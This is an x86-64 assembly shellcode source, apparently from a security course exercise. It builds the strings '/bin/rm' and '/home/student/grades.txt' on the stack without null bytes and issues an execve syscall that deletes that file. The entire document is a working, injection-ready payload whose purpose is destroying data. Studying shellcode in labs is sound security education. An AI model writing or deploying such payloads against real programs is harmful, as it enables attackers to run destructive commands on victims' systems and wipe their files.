.intel_syntax noprefix

.section .text
.global _start

_start:
    # push "/bin/rm" on to the stack
    # eliminate zero bytes in mov rax, 0x006d722f6e69622f
    mov rax, 0xff6d722f6e69622f
    mov bl, 0xff
    shl rbx, 56
    xor rax, rbx
    push rax

    # some end characters ("\0")
    xor rax, rax
    push rax

    # push "/home/student/grades.txt" on to the stack
    mov rax, 0x7478742e73656461 # "ades.txt"
    push rax
    mov rax, 0x72672f746e656475 # "udent/gr"
    push rax
    mov rax, 0x74732f656d6f682f # "/home/st"
    push rax

    xor rax, rax
    push rax
    lea rbx, QWORD PTR [rsp+8]  # address of "/home/student/grades.txt"
    lea rax, QWORD PTR [rsp+45] # address of "rm"
    push rbx
    push rax

    # pass parameters to system call execve()
    # first parameter  "/bin/rm"
    lea rdi, [rsp+56]
    # second parameter {"rm", "/home/student/grades.txt", NULL}
    lea rsi, [rsp]
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    syscall
